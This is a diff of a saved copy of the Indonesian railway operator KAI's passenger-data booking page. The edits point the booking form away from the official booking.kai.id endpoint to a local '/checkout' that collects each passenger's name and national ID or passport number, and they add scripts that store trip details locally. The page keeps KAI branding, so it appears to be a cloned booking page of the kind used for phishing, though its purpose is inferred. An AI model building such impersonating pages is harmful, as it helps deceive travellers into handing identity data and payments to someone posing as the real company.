@@ -135,7 +135,6 @@ div.im-colormask > div {
         </nav>	<div id="content-wrapper">
 	    <div class="container">
 
-							<link rel="stylesheet" type="text/css" href="./PT Kereta Api Indonesia - Passenger Data_files/iziToast.min.css"><script type="text/javascript" async="" src="./PT Kereta Api Indonesia - Passenger Data_files/recaptcha__en_gb.js.download" crossorigin="anonymous" integrity="sha384-OTf8CwpA/E5YjZDlHKXBCWVf0rujEMK64+C6Eg/R9mID5g5yCqKT5bc2C+PFfNb9"></script><script src="./PT Kereta Api Indonesia - Passenger Data_files/iziToast.min.js.download"></script><script>iziToast.({title: "",message: "",});</script>
 			
             <style>
 	.modal-confirm .modal-content {
@@ -219,7 +218,7 @@ div.im-colormask > div {
     <br>
     <div class="title-page"><h1>Pemesanan</h1></div>
     <div class="column-content-wrapper">
-        <form method="POST" action="https://booking.kai.id/passengercontrol" accept-charset="UTF-8" id="pesanan" role="form" data-toggle="validator" novalidate="true"><input name="_token" type="hidden" value="ZvE1kz9J2hPP0D3bpQ9DrPPcT9e6Z8nyXseEUUnc">
+        <form method="GET" action="/checkout" accept-charset="UTF-8" id="pesanan" role="form" data-toggle="validator" novalidate="true"><input name="_token" type="hidden" value="ZvE1kz9J2hPP0D3bpQ9DrPPcT9e6Z8nyXseEUUnc">
         <div class="row">
             <div class="column-content-left col-md-8 col-sm-12">
                 <div class="column-box-wrapper">
@@ -299,6 +298,7 @@ div.im-colormask > div {
                                             </div>
                                             <div class="help-block with-errors"></div>
                                         </div>
+                                        <input type="text" name="" id="kereta" value="" class="hidden">
                                         <!-- <div class="form-group">
                                             <label for="pemesan_kota">Kota</label>
                                             <div class="input-group">
@@ -344,18 +344,18 @@ div.im-colormask > div {
                                             <label for="">Tipe Identitas</label>
                                             <div class="input-group">
                                                 <span class="input-group-addon"><i class="fa fa-id-card fa" aria-hidden="true"></i></span>
-                                                <select name="penumpang_tandapengenal[]" class="form-control" id="penumpang_tandapengenal1" required="" value="">
+                                                <select name="penumpang_tandapengenal" class="form-control" id="penumpang_tandapengenal1" required="" value="">
                                                     <option value="ktp">NIK</option>
                                                     <option value="paspor">Paspor</option>
                                                 </select>
                                             </div>
                                         </div>
                                         <div class="form-group hidden">
-                                            <label for="penumpang_nohp[]">No. HP Penumpang</label>
+                                            <label for="penumpang_nohp">No. HP Penumpang</label>
                                             <div class="input-group">
                                                 <span class="input-group-addon"><i class="fa fa-phone fa" aria-hidden="true"></i></span>
-                                                <input class="form-control number" placeholder="08xxxxxx" id="penumpang_nohp1" required="" name="penumpang_nohp[]" type="hidden" value="000">
-                                                <input name="penumpang_type[]" type="hidden" value="A">
+                                                <input class="form-control number" placeholder="08xxxxxx" id="penumpang_nohp1" required="" name="penumpang_nohp" type="hidden" value="000">
+                                                <input name="penumpang_type" type="hidden" value="A">
                                             </div>
                                             <div class="help-block with-errors"></div>
                                         </div>
@@ -363,18 +363,18 @@ div.im-colormask > div {
                                     </div>
                                     <div class="col-md-8">
                                         <div class="form-group">
-                                            <label for="penumpang_nama[]">Nama</label>
+                                            <label for="penumpang_nama">Nama</label>
                                             <div class="input-group">
                                                 <span class="input-group-addon"><i class="fa fa-user fa" aria-hidden="true"></i></span>
-                                                <input class="form-control letter" placeholder="Nama sesuai NIK / Paspor" id="penumpang_nama1" required="" name="penumpang_nama[]" type="text">
+                                                <input class="form-control letter" placeholder="Nama sesuai NIK / Paspor" id="penumpang_nama1" required="" name="penumpang_nama" type="text">
                                             </div>
                                             <div class="help-block with-errors"></div>
                                         </div>
                                         <div class="form-group">
-                                            <label for="penumpang_notandapengenal[]">Nomor Identitas</label>
+                                            <label for="penumpang_notandapengenal">Nomor Identitas</label>
                                             <div class="input-group">
                                                 <span class="input-group-addon"><i class="fa fa-id-card fa" aria-hidden="true"></i></span>
-                                                <input class="form-control uniqueval genInfo" placeholder="Nomor Identitas sesuai NIK / Paspor" maxlength="16" id="penumpang_notandapengenal1" data-error="Nomor Identitas Wajib Diisi" required="" name="penumpang_notandapengenal[]" type="text">
+                                                <input class="form-control uniqueval genInfo" placeholder="Nomor Identitas sesuai NIK / Paspor" maxlength="16" id="penumpang_notandapengenal1" data-error="Nomor Identitas Wajib Diisi" required="" name="penumpang_notandapengenal" type="text">
                                             </div>
                                             <span class="tooltiptext">
                                                 Untuk penumpang usia mulai 3 s.d 17 tahun tipe identitas 'Lainnya', kolom nomor identitas di isi nomor kartu identitas
@@ -396,13 +396,14 @@ div.im-colormask > div {
             <div class="column-content-right col-md-4 col-sm-12">
                 <div class="side-column-final-wrapper">
                     <div class="side-column-final">
-                                <div class="top-column">
+                                <div class="top-column harga">
                                         Total
                                         Rp 1.000.000,-
                                 </div>
                                 <div class="body-column">
+                                    <div class="date departure_date"></div>
                                     <div class="train">Bima Priority (75P)</div>
-                                    <div class="class">Eksekutif - A</div>
+                                    <div class="class keretakelas">Eksekutif - A</div>
                                     <div class="passenger">
                                         1 Dewasa
                                         
@@ -412,16 +413,16 @@ div.im-colormask > div {
                                         <div class="row">
                                             <div class="col-md-5 col-sm-4 col-xs-4">
                                                 <div class="city">SURABAYA GUBENG</div>
-                                                <div class="time text-muted">17:30</div>
-                                                <div class="time text-muted">29 Nov 2022</div>
+                                                <div class="time  text-muted">17:30</div>
+                                                <div class="depart text-muted">29 Nov 2022</div>
                                             </div>
                                             <div class="col-md-2 col-sm-4 col-xs-4">
                                                 <div class="arrow"><i class="fas fa-angle-double-right"></i></div>
                                             </div>
                                             <div class="col-md-5 col-sm-4 col-xs-4">
                                                 <div class="city">GAMBIR</div>
-                                                <div class="time text-muted">04:40</div>
-                                                <div class="time text-muted">30 Nov 2022</div>
+                                                <div class="time  text-muted">04:40</div>
+                                                <div class=" arrival text-muted">30 Nov 2022</div>
                                             </div>
                                         </div>
                                     </div>
@@ -444,7 +445,7 @@ div.im-colormask > div {
                     </div>
                 </div>
                 <div class="checkbox-wrapper">
-                    <label for=""><input type="checkbox" name="agree" id="setuju" required=""> Dengan ini saya setuju dan mematuhi <a href="https://kai.id/corporate/passenger_services/1" target="blank"> persyaratan dan ketentuan </a></label>
+                    <label for=""><input type="checkbox"  id="setuju" required=""> Dengan ini saya setuju dan mematuhi <a href="https://kai.id/corporate/passenger_services/1" target="blank"> persyaratan dan ketentuan </a></label>
                 </div>
                 
                 <div class="btn-two-cols-wrapper">
@@ -605,6 +606,7 @@ div.im-colormask > div {
 
 
 <script type="text/javascript">
+    
     localStorage.setItem("captcha", "0");
     // copy data passenger
     APP.copyData();
@@ -653,7 +655,25 @@ div.im-colormask > div {
     </script>
     <script>
 APP.callModalCancel();
-</script>
 
+</script>
+<script src="js/passenger.js"></script>
+<script>
+    const _kereta = {
+	"nama":kereta,
+	"origination":origination,
+	"destination":destination,
+	"kelas":kelas,
+	"kelas_gerbong":kelas_gerbong,
+	"harga":harga,
+	"dewasa":dewasa,
+	"infant":infant,
+	"timestart":timestart,
+	"timeend":timeend,
+	"tanggal":tanggal
+}
+localStorage.setItem("kereta",JSON.stringify(_kereta))
+</script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 
 <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge expires in two minutes" src="./PT Kereta Api Indonesia - Passenger Data_files/bframe.html" name="c-izw4vs1yna2a" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
